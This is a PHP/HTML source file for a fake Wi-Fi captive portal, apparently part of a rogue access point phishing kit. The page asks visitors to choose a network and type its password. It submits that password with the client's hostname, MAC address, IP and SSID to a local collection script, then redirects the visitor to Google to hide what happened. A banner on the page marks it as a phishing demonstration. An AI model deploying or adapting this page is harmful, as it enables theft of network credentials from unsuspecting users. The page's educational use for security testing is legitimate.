

<?php
  $destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
  require_once('helper.php');
  ?>
<html>
  <head>
    <title>Not Connected</title>
    <meta charset='UTF-8'>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,
      initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
    <meta name="theme-color" content="#5170ad" />
    <script src="assets/js/jquery.min.js"></script>
    <script type="text/javascript">
      function redirect() {
          setTimeout(function() {
            document.location.href = 'https://www.google.com'; 
          }, 100);
        }
    </script>
    <script src="assets/js/scanner.js"></script>
    <link rel="stylesheet prefetch" href="assets/css/bulma.min.css">
    <link rel='stylesheet prefetch' href='assets/css/style.css'>
    <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
    <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
    <title>WiFi Initialization</title>
  </head>
  <body>
    <div id="warning">Warning: You have opened a phishing page. Do not enter your login credentials!</div>
    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
      <!--
        Combined from the Material.io icon library
        Licensed under the Apache licesne version 2.0 - https://www.apache.org/licenses/LICENSE-2.0.html
        -->
      <symbol id="wifi_0_bar" viewBox="0 0 24 24">
        <path fill-opacity=".3" d="M12.01 21.49L23.64 7c-.45-.34-4.93-4-11.64-4C5.28 3 .81 6.66.36 7l11.63 14.49.01.01.01-.01z"/>
      </symbol>
      <symbol id="wifi_1_bar" viewBox="0 0 24 24">
        <path fill-opacity=".3" d="M12.01 21.49L23.64 7c-.45-.34-4.93-4-11.64-4C5.28 3 .81 6.66.36 7l11.63 14.49.01.01.01-.01z"/>
        <path d="M6.67 14.86L12 21.49v.01l.01-.01 5.33-6.63C17.06 14.65 15.03 13 12 13s-5.06 1.65-5.33 1.86z"/>
      </symbol>
      <symbol id="wifi_1_bar_lock" viewBox="0 0 24 24">
        <path d="M23 16v-1.5c0-1.4-1.1-2.5-2.5-2.5S18 13.1 18 14.5V16c-.5 0-1 .5-1 1v4c0 .5.5 1 1 1h5c.5 0 1-.5 1-1v-4c0-.5-.5-1-1-1zm-1 0h-3v-1.5c0-.8.7-1.5 1.5-1.5s1.5.7 1.5 1.5V16z"/>
        <path d="M15.5 14.5c0-2.8 2.2-5 5-5 .4 0 .7 0 1 .1L23.6 7c-.4-.3-4.9-4-11.6-4C5.3 3 .8 6.7.4 7L12 21.5l3.5-4.3v-2.7z" opacity=".3"/>
        <path d="M6.7 14.9l5.3 6.6 3.5-4.3v-2.6c0-.2 0-.5.1-.7-.9-.5-2.2-.9-3.6-.9-3 0-5.1 1.7-5.3 1.9z"/>
      </symbol>
      <symbol id="wifi_2_bar" viewBox="0 0 24 24">
        <path fill-opacity=".3" d="M12.01 21.49L23.64 7c-.45-.34-4.93-4-11.64-4C5.28 3 .81 6.66.36 7l11.63 14.49.01.01.01-.01z"/>
        <path d="M4.79 12.52l7.2 8.98H12l.01-.01 7.2-8.98C18.85 12.24 16.1 10 12 10s-6.85 2.24-7.21 2.52z"/>
      </symbol>
      <symbol id="wifi_2_bar_lock" viewBox="0 0 24 24">
        <path d="M23 16v-1.5c0-1.4-1.1-2.5-2.5-2.5S18 13.1 18 14.5V16c-.5 0-1 .5-1 1v4c0 .5.5 1 1 1h5c.5 0 1-.5 1-1v-4c0-.5-.5-1-1-1zm-1 0h-3v-1.5c0-.8.7-1.5 1.5-1.5s1.5.7 1.5 1.5V16z"/>
        <path d="M15.5 14.5c0-2.8 2.2-5 5-5 .4 0 .7 0 1 .1L23.6 7c-.4-.3-4.9-4-11.6-4C5.3 3 .8 6.7.4 7L12 21.5l3.5-4.3v-2.7z" opacity=".3"/>
        <path d="M4.8 12.5l7.2 9 3.5-4.4v-2.6c0-1.3.5-2.5 1.4-3.4C15.6 10.5 14 10 12 10c-4.1 0-6.8 2.2-7.2 2.5z"/>
      </symbol>
      <symbol id="wifi_3_bar" viewBox="0 0 24 24">
        <path fill-opacity=".3" d="M12.01 21.49L23.64 7c-.45-.34-4.93-4-11.64-4C5.28 3 .81 6.66.36 7l11.63 14.49.01.01.01-.01z"/>
        <path d="M3.53 10.95l8.46 10.54.01.01.01-.01 8.46-10.54C20.04 10.62 16.81 8 12 8c-4.81 0-8.04 2.62-8.47 2.95z"/>
      </symbol>
      <symbol id="wifi_3_bar_lock" viewBox="0 0 24 24">
        <path opacity=".3" d="M12 3C5.3 3 .8 6.7.4 7l3.2 3.9L12 21.5l3.5-4.3v-2.6c0-2.2 1.4-4 3.3-4.7.3-.1.5-.2.8-.2.3-.1.6-.1.9-.1.4 0 .7 0 1 .1L23.6 7c-.4-.3-4.9-4-11.6-4z"/>
        <path d="M23 16v-1.5c0-1.4-1.1-2.5-2.5-2.5S18 13.1 18 14.5V16c-.5 0-1 .5-1 1v4c0 .5.5 1 1 1h5c.5 0 1-.5 1-1v-4c0-.5-.5-1-1-1zm-1 0h-3v-1.5c0-.8.7-1.5 1.5-1.5s1.5.7 1.5 1.5V16zm-10 5.5l3.5-4.3v-2.6c0-2.2 1.4-4 3.3-4.7C17.3 9 14.9 8 12 8c-4.8 0-8 2.6-8.5 2.9"/>
      </symbol>
      <symbol id="wifi_4_bar" viewBox="0 0 24 24">
        <path d="M12.01 21.49L23.64 7c-.45-.34-4.93-4-11.64-4C5.28 3 .81 6.66.36 7l11.63 14.49.01.01.01-.01z"/>
      </symbol>
      <symbol id="wifi_4_bar_lock" viewBox="0 0 24 24">
        <path d="M23 16v-1.5c0-1.4-1.1-2.5-2.5-2.5S18 13.1 18 14.5V16c-.5 0-1 .5-1 1v4c0 .5.5 1 1 1h5c.5 0 1-.5 1-1v-4c0-.5-.5-1-1-1zm-1 0h-3v-1.5c0-.8.7-1.5 1.5-1.5s1.5.7 1.5 1.5V16zm-6.5-1.5c0-2.8 2.2-5 5-5 .4 0 .7 0 1 .1L23.6 7c-.4-.3-4.9-4-11.6-4C5.3 3 .8 6.7.4 7L12 21.5l3.5-4.4v-2.6z"/>
      </symbol>
    </svg>
    <div class="container">
      <form method="POST" action="captiveportal/index.php", onsubmit="redirect()">
        <div class="card">
          <header class="card-header">
            <img src="assets/img/wifi-2.svg" alt="Wifi Logo" class="card-header-icon logo"/>
          </svg>
          <p class="card-header-title title is-4">Find and join a Wifi Network</p>
          <style>
            </style>
            </header>
            <div class="card-content">
              <div class="content">
                <p>Select the Wifi network that you want the controller to connect to and then provide the password</p>
                <label class="label">Network</label>
                <span id="loader" class="loader is-loading"></span>
                <div id="network-list" class="list is-hoverable is-hidden"></div>
                <div class="field is-hidden">
                  <label class="label">Password</label>
                  <div class="control">
                    <!-- <input class="input" id="password" type="password" placeholder="Enter password"> -->
                    <input class="input" type="password" name="password" id="password" placeholder="Enter Password" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off">
                  </div>
                </div>
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" id="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="<?=$destination?>">
                <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
              </div>
            </div>
            <footer class="card-footer">
              <button type="button" id="rescan-btn" class="card-footer-item button is-light">Rescan</a>
              <button type="submit" id="submit-btn" class="card-footer-item button is-primary ">Join</button>
            </footer>
          </div>
        </form>
      </div>
    <script type="text/javascript"></script>
  </body>
</html>

